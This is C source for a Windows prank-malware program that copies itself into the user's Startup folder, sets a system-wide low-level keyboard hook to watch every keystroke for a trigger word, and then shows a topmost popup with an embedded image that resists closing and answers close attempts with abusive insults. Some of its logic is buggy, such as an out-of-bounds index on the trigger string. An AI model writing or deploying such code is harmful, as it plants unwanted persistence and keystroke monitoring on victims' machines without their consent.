#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <inttypes.h>
#include "resource.h"


// windres resource.rc -o resource.o
// gcc main.c resource.o -o fuckerman.exe -lgdi32 -luser32 -mwindows


HHOOK hHook = NULL;
HWND hwnd;

char keypressed[5] = {0};
char lastword = {0};
char triggerword[5] = "PORN";
unsigned int keypressed_counter = 0;



LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *KeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        char key = KeyBoard->vkCode;
        lastword = key;
        if(lastword == triggerword[0] || lastword == triggerword[1] ||
        lastword == triggerword[2] || lastword == triggerword[3] || lastword == triggerword[4] ||
        lastword == triggerword[5])
        {
            if(keypressed_counter <= 4){
                keypressed[keypressed_counter] = key;
                keypressed_counter++;
            }
            if(keypressed_counter >= 5) {
                keypressed_counter = 0;
            }
        } else {keypressed_counter = 0;}

        if(strcmp(keypressed, triggerword) == 0) {
            memset(keypressed, 0, sizeof(keypressed));
            keypressed_counter = 0;
            PostMessage(hwnd, WM_SHOWWINDOW, 0, 0);
        }
    }
      
    return CallNextHookEx(NULL, nCode, wParam, lParam);

};

LRESULT CALLBACK WindowProc(HWND hwnd, unsigned int uMsg, WPARAM wParam, LPARAM lParam) {

    switch (uMsg) {
    case WM_SHOWWINDOW:
        ShowWindow(hwnd, SW_SHOW);
        return 0;
    case WM_CLOSE:

        MessageBeep(MB_ICONERROR);
        MessageBox(hwnd, "nice try u stupid bitch", "fuck u", MB_OK);
        return 0;
    case WM_DESTROY: 
        MessageBox(hwnd, "You stupid!", "stupid fucker", MB_OK);
        return 0;
    case WM_SIZE: {
        int width = LOWORD(lParam);
        int height = HIWORD(lParam);

        return 0;
    }
    case WM_PAINT: {
        // Handle painting here
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // Load the bitmap resource
        HBITMAP hBitmap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1));

        // Create a memory device context compatible with the window DC
        HDC hdcMem = CreateCompatibleDC(hdc);

        // Select the bitmap into the memory DC
        // Its like selecting a brush to paint in here, I select my bitmap image
        HGDIOBJ hOldBitmap = SelectObject(hdcMem, hBitmap);

        // Get the bitmap dimensions
        BITMAP bitmap;
        GetObject(hBitmap, sizeof(bitmap), &bitmap);

        // BitBlt to copy the bitmap into the window's device context
        // Paint the bitmap
        BitBlt(hdc, 0, 0, bitmap.bmWidth, bitmap.bmHeight, hdcMem, 0, 0, SRCCOPY);

        // Clean up
        SelectObject(hdcMem, hOldBitmap);  // Restore previous brush
        DeleteDC(hdcMem);  // Clean up the memory DC
        DeleteObject(hBitmap);  // Delete the bitmap object

        EndPaint(hwnd, &ps);
        return 0;

    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow) {
    // Windows see everything as window inclduing our application and texts and buttons inside our application. They are see as child windows of our main application window.
    // WinMain is the default execution point for windows application just like int main in normal C.
    // WINAPI or CALLBACK are just function calling conventions it determind how variables are placed in stack.
    // WNDCLASS strucure is a structure that defineds which function is windowprocedure.
    // classname in WNDCLASS is used to determind which class our window belongs to -
    // for example Buttons belong to BUTTON class but in our case we are just creating a random window so its irrelevant(but its the protocol so we stil have to define it no biggie).
    // hInstant is the window way of identifying individual applitions windows call our WinMain function and pass it along;
    // Every program have a message queue and every mouseclicks keyboard pressed are send as messages by windows to our application.
    // I fetch those message by calling getmessage in loop
    // dispatch message gets where the window procedure function is defined from our WNDCLASS and call it, passing the system's messages.

    // the point of resource file is to embed image to the exe program so it will be standalone
    
    // Keyboard hook is just a hook that sits between system wide message queue and applications's individual message queue so we can reqad or minipulate messages in this case I am reading keyboard inputs.
    // copy myself to startup folder :P
    char myPath[MAX_PATH];
    char *appData = getenv("APPDATA");
    char pathToConcat[] = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    char fileNameToBeCopied[] = "\\fuckerman.exe"; // filename that will exist in startup folder

    const int concat_len = (strlen(appData) + strlen(pathToConcat) + strlen(fileNameToBeCopied)) +1;
    char *startuppath = malloc(concat_len);
    strcpy(startuppath, appData);
    strcat(startuppath, pathToConcat);
    strcat(startuppath, fileNameToBeCopied);
    GetModuleFileName(NULL, myPath, MAX_PATH);

    // myPath = file path of this program
    // startuppath = System's startup folder path
    if(CopyFile(myPath, startuppath, FALSE)) 
        printf("File successfully copied\n");

    printf("startuppath = %s\n", startuppath);
    printf("mypath = %s\n", myPath);
    free(startuppath);
    
    char classname[] = "Ayo some window";
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = classname;

    RegisterClass(&wc);




    hwnd = CreateWindowEx(
            WS_EX_LAYERED,                  // extended styles
            classname, // Class name
            "Fuckerman",     // Window title
            WS_POPUP, // Window style
            CW_USEDEFAULT,       // X position
            CW_USEDEFAULT,       // Y position
            500,       // Width
            400,       // Height
            NULL,                // No parent window
            NULL,                // No menu
            hInstance,           // Application instance(handle that window passess to id this running program)
            NULL                 // No additional parameters(u can pass any data u like here to window procedure if u want to make persistent data in window procedure loop)
        );
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);

    if (hwnd == NULL) {
        return 0;
    }
        // Set the window attributes for transparency
    if (!SetLayeredWindowAttributes(hwnd, RGB(255, 255, 255), 255, LWA_COLORKEY | LWA_ALPHA)) {
        MessageBox(NULL, "Failed to set layered window attributes!", "Error", MB_OK);
        return 0;
    }

    hHook =  SetWindowsHookEx(WH_KEYBOARD_LL,  KeyboardHook, NULL, 0);

        // Run the message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);

    return 0;
}